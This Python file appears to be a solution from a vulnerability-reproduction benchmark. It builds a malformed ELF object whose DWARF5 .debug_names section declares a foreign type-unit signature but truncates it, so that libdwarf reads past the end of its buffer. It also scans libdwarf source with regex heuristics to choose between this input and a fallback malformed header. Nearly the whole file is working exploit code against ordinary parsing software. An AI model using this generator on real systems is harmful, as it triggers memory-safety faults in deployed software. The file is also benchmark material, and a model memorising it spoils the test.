import os
import re
import tarfile
import struct
from typing import Optional


def _align(off: int, a: int) -> int:
    if a <= 1:
        return off
    r = off % a
    return off if r == 0 else off + (a - r)


def _elf64_ehdr(e_shoff: int, e_shnum: int, e_shstrndx: int) -> bytes:
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8  # 64-bit, little-endian
    e_type = 1  # ET_REL
    e_machine = 62  # EM_X86_64
    e_version = 1
    e_entry = 0
    e_phoff = 0
    e_flags = 0
    e_ehsize = 64
    e_phentsize = 0
    e_phnum = 0
    e_shentsize = 64
    return struct.pack(
        "<16sHHIQQQIHHHHHH",
        e_ident,
        e_type,
        e_machine,
        e_version,
        e_entry,
        e_phoff,
        e_shoff,
        e_flags,
        e_ehsize,
        e_phentsize,
        e_phnum,
        e_shentsize,
        e_shnum,
        e_shstrndx,
    )


def _elf64_shdr(
    sh_name: int,
    sh_type: int,
    sh_flags: int,
    sh_addr: int,
    sh_offset: int,
    sh_size: int,
    sh_link: int = 0,
    sh_info: int = 0,
    sh_addralign: int = 1,
    sh_entsize: int = 0,
) -> bytes:
    return struct.pack(
        "<IIQQQQIIQQ",
        sh_name,
        sh_type,
        sh_flags,
        sh_addr,
        sh_offset,
        sh_size,
        sh_link,
        sh_info,
        sh_addralign,
        sh_entsize,
    )


def _build_min_dwarf5_debug_info() -> bytes:
    # Minimal DWARF5 CU: unit_length, version(5), unit_type(compile=1), addr_size(8), abbrev_off(0), then abbrev code 0.
    body = struct.pack("<HBBI", 5, 1, 8, 0) + b"\x00"
    return struct.pack("<I", len(body)) + body


def _build_min_debug_abbrev() -> bytes:
    return b"\x00"


def _build_debug_names_poc(foreign_count: int, foreign_bytes_present: int) -> bytes:
    # DWARF5 .debug_names unit:
    # unit_length (32-bit), version, padding, cu_count, local_tu_count, foreign_tu_count,
    # bucket_count, name_count, abbrev_table_size, augmentation_string_size
    version = 5
    padding = 0
    cu_count = 0
    local_tu_count = 0
    foreign_tu_count = foreign_count
    bucket_count = 0
    name_count = 0
    abbrev_table_size = 0
    augmentation_string_size = 0

    header_wo_length = struct.pack(
        "<HHIIIIIII",
        version,
        padding,
        cu_count,
        local_tu_count,
        foreign_tu_count,
        bucket_count,
        name_count,
        abbrev_table_size,
        augmentation_string_size,
    )
    # Truncate the foreign signature list deliberately.
    foreign_data = b"\x00" * max(0, foreign_bytes_present)
    unit_length = len(header_wo_length) + len(foreign_data)
    return struct.pack("<I", unit_length) + header_wo_length + foreign_data


def _detect_foreign_sig_limit_bug_from_source(src_path: str) -> Optional[bool]:
    """
    Heuristic: if dwarf_debugnames.c seems to treat foreign TU signatures as 4 bytes in any limit/size computation,
    assume the vulnerable behavior is present and emit the foreign-signature truncation PoC.

    Returns:
        True/False if determined, None if unknown.
    """
    text = None
    try:
        if os.path.isdir(src_path):
            target = None
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if fn == "dwarf_debugnames.c":
                        p = os.path.join(root, fn)
                        if "dwarf_debugnames.c" in p.replace("\\", "/"):
                            target = p
                            break
                if target:
                    break
            if target and os.path.isfile(target):
                with open(target, "rb") as f:
                    text = f.read().decode("latin1", "ignore")
        else:
            with tarfile.open(src_path, "r:*") as tf:
                cand = None
                for m in tf.getmembers():
                    n = m.name
                    if n.endswith("dwarf_debugnames.c"):
                        # prefer src/lib/libdwarf/...
                        if "src/lib/libdwarf/" in n or "/libdwarf/" in n:
                            cand = m
                            break
                        if cand is None:
                            cand = m
                if cand is not None:
                    f = tf.extractfile(cand)
                    if f:
                        text = f.read().decode("latin1", "ignore")
    except Exception:
        return None

    if not text:
        return None

    # Look for suspicious 4-byte math involving foreign_type_unit_count.
    # These patterns are deliberately broad; if present, assume vulnerability.
    patterns = [
        r"foreign_type_unit_count\s*[*]\s*4\b",
        r"foreign_type_unit_count\s*<<\s*2\b",
        r"\+\s*foreign_type_unit_count\s*\)",  # potentially missing multiplier
        r"\+\s*foreign_type_unit_count\s*;",   # potentially missing multiplier
    ]
    hit = any(re.search(p, text) for p in patterns)

    # If we also see explicit 8-byte sizing for foreign signatures in limit computations, be conservative.
    patterns_good = [
        r"foreign_type_unit_count\s*[*]\s*8\b",
        r"foreign_type_unit_count\s*<<\s*3\b",
        r"sizeof\s*\(\s*Dwarf_Sig8\s*\)",
    ]
    good = any(re.search(p, text) for p in patterns_good)

    if hit and not good:
        return True
    if good and not hit:
        return False
    if hit:
        return True
    return None


def _build_elf_with_sections(section_payloads):
    """
    section_payloads: list of tuples (name:str, sh_type:int, data:bytes, align:int)
    """
    # Build shstrtab
    names = ["", ".shstrtab"] + [n for (n, _, _, _) in section_payloads]
    shstrtab = b"\x00"
    name_off = {"": 0}
    for n in names[1:]:
        name_off[n] = len(shstrtab)
        shstrtab += n.encode("ascii") + b"\x00"

    # Layout: [EHDR][SHDR table][section data...], with .debug_names intended at end if ordered last.
    shnum = 2 + len(section_payloads)  # null + shstrtab + others
    e_shoff = 64
    shdr_table_size = shnum * 64
    data_off = _align(e_shoff + shdr_table_size, 1)

    # Place section data
    sections = []
    # section 0: null
    sections.append(("", 0, b"", 0, 0, 0, 0, 1))
    # section 1: shstrtab
    shstrtab_off = data_off
    shstrtab_size = len(shstrtab)
    data_off = _align(shstrtab_off + shstrtab_size, 1)
    sections.append((".shstrtab", 3, shstrtab, shstrtab_off, shstrtab_size, 0, 0, 1))

    # other sections in order
    for (nm, sht, data, algn) in section_payloads:
        algn = algn if algn and algn > 0 else 1
        off = _align(data_off, algn)
        size = len(data)
        data_off = off + size
        sections.append((nm, sht, data, off, size, 0, 0, algn))

    # Construct file buffer
    total_size = data_off
    buf = bytearray(b"\x00" * total_size)

    # Write ELF header
    ehdr = _elf64_ehdr(e_shoff=e_shoff, e_shnum=shnum, e_shstrndx=1)
    buf[0:64] = ehdr

    # Write section headers
    shdrs = []
    # 0: null
    shdrs.append(_elf64_shdr(0, 0, 0, 0, 0, 0, 0, 0, 1, 0))
    # 1: shstrtab
    shdrs.append(_elf64_shdr(name_off[".shstrtab"], 3, 0, 0, shstrtab_off, shstrtab_size, 0, 0, 1, 0))
    # remaining
    for (nm, sht, _data, off, size, link, info, algn) in sections[2:]:
        shdrs.append(_elf64_shdr(name_off[nm], sht, 0, 0, off, size, link, info, algn, 0))

    shdr_blob = b"".join(shdrs)
    buf[e_shoff : e_shoff + len(shdr_blob)] = shdr_blob

    # Write section data
    for (nm, sht, data, off, size, link, info, algn) in sections[1:]:
        if size:
            buf[off : off + size] = data

    return bytes(buf)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Primary strategy: truncated foreign type unit signature list in .debug_names.
        # If source inspection strongly suggests otherwise, fall back to a more generic malformed header-only unit.
        bug = _detect_foreign_sig_limit_bug_from_source(src_path)

        debug_info = _build_min_dwarf5_debug_info()
        debug_abbrev = _build_min_debug_abbrev()

        if bug is False:
            # Fallback: header-only unit with inconsistent non-zero name_count could exercise other limit bugs
            # while remaining small. (Should be safely rejected in fixed versions.)
            debug_names = struct.pack(
                "<IHHIIIIIII",
                32,  # unit_length = just the header (after this field)
                5, 0,
                0, 0, 0,
                0, 1,  # bucket_count=0, name_count=1
                0, 0,
            )
        else:
            # foreign_tu_count=1 but only 4 bytes of the 8-byte signature present.
            debug_names = _build_debug_names_poc(foreign_count=1, foreign_bytes_present=4)

        # Ensure .debug_names is the last section payload so any over-read tends to go past EOF in file-backed buffers.
        return _build_elf_with_sections(
            [
                (".debug_info", 1, debug_info, 1),
                (".debug_abbrev", 1, debug_abbrev, 1),
                (".debug_names", 1, debug_names, 1),
            ]
        )